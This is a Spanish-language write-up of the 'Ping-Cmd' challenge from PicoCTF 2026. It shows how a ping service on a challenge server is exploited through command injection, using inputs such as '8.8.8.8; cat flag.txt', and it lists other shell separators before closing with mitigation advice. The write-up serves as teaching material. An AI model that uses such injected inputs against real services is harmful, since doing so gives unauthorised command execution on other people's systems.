# Ping-Cmd - PicoCTF 2026

**Categoría:** General Skills  
**Dificultad:** Easy  
**Puntos:** 100  
**Autor:** Yahaya Meddy  

## Descripción del Reto

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

El reto consiste en un servicio que permite hacer ping a direcciones IP, pero con una restricción aparente: solo permite la IP `8.8.8.8`. Sin embargo, el servicio es vulnerable a inyección de comandos, lo que nos permitirá ejecutar comandos arbitrarios en el sistema.

**Conexión:**

nc mysterious-sea.picoctf.net 51655
text


## Solución

### 1. Reconocimiento Inicial

Primero, nos conectamos al servicio para ver cómo funciona:

```bash
┌──(root㉿kali)-[/home/kr3s4l4/picoctf/easy/ping-cmd]
└─# nc mysterious-sea.picoctf.net 51655

El servicio nos pide una dirección IP:
text

Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 

Probamos con la IP permitida:
text

8.8.8.8

Obtenemos la salida normal del comando ping:
text

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=12.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=109 time=12.8 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.806/12.819/12.832/0.013 ms

2. Identificación de la Vulnerabilidad

El servicio ejecuta el comando ping con la entrada del usuario sin sanitizarla adecuadamente. Esto nos permite usar caracteres especiales de shell para inyectar comandos adicionales.

https://images/initial_connection.png
3. Exploración del Sistema

Probamos con el comando ls usando el separador ; para listar los archivos en el directorio:
bash

ping 8.8.8.8; ls

Salida obtenida:
text

flag.txt
script.sh

https://images/ls_command.png

Encontramos dos archivos:

    flag.txt - Probablemente contiene la bandera

    script.sh - El script que ejecuta el servicio

4. Obtención de la Bandera

Leemos el contenido del archivo flag.txt:
bash

ping 8.8.8.8; cat flag.txt

Salida obtenida:
text

picoCTF{*****************************************}

https://images/flag.png
Explicación Técnica
Inyección de Comandos

El servidor ejecuta algo similar a:
bash

ping $USER_INPUT

Donde $USER_INPUT es lo que introducimos. Al ingresar 8.8.8.8; ls, el comando que se ejecuta es:
bash

ping 8.8.8.8; ls

El punto y coma (;) permite ejecutar múltiples comandos en una sola línea, ejecutándolos secuencialmente sin importar si el comando anterior tuvo éxito o no.
Caracteres de Control Utilizados

    ; - Separador de comandos (ejecuta comandos secuencialmente)

    También podríamos haber usado:

        && - Ejecuta el segundo comando solo si el primero tiene éxito

        || - Ejecuta el segundo comando solo si el primero falla

        | - Pipe, envía la salida del primer comando al segundo

Medidas de Mitigación

Para prevenir este tipo de vulnerabilidades, se debería:

    Sanitizar la entrada: Validar que solo contenga direcciones IP válidas

    Usar comandos con parámetros: En lugar de concatenar strings, usar funciones que permitan pasar argumentos de forma segura

    Escapar caracteres especiales: Escapar o eliminar caracteres como ;, |, &, etc.

    Principio de mínimo privilegio: Ejecutar el servicio con los permisos mínimos necesarios

Lecciones Aprendidas

    La inyección de comandos es una vulnerabilidad crítica que puede permitir la ejecución de código arbitrario

    Nunca confiar en la entrada del usuario sin sanitizarla adecuadamente

    Es importante validar y filtrar la entrada antes de usarla en comandos del sistema

    Los caracteres de control como ;, |, &&, || pueden ser peligrosos si no se manejan correctamente
